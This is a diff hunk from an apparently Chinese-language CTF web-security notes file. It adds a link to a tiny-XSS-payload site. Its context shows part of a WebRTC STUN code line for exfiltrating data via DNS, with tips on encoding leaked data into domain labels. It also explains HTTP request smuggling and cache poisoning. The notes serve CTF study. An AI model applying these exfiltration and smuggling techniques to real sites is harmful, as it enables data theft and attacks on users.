@@ -2901,6 +2901,7 @@ pc = new RTCPeerConnection({"iceServers":[{"urls":["stun:"+ "data_want_to_exfilt
 ```
 wp里还有将要泄露的内容转换为符合域名规范的16进制的进阶payload。注意转为16进制内容可能会很长，而域名的每个label最长63个字符，超过后请求失败。所以需要手动发送多次payload，每次更改截取的索引。
 - 如果是借助get传payload，尽量将paylaod base64encdoe。不然浏览器会自动编码特殊字符
+- [tiny xss payloads](https://tinyxss.terjanq.me/)
 297. [Chunky](https://fireshellsecurity.team/sekaictf-frog-waf-and-chunky/#challenge-chunky-16-solves)
 - 请求走私（[Request Smugling](https://portswigger.net/web-security/request-smuggling)）。也可以参考 https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn 。简单来说，就是一个服务由多个服务器组成，前端和后端。这些服务器对Content-Length和Transfer-Encoding的处理不一致，导致前端认为是一个request，传给后端就变成了两个。能利用这个走私进去的request进行特殊的攻击
 - [Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning)。有请求走私的情况下可以考虑这个攻击（当然前提是这个服务有cache server）。Cache Poisoning指的是，以某种方法让请求A时服务器返回的内容为有害payload，然后让cache server记住这个内容，以后任何用户访问A时拿到的都是payload。结合请求走私，我们在请求A的后面走私一个请求B，后端服务器会返回A和B的response，但是前端服务器认为自己只请求了A，只读取了A的response。接下来请求C时，B就被返回了，造成请求C获取到的却是B。如果能让server cache这个结果，以后任何人访问C得到的都是B了
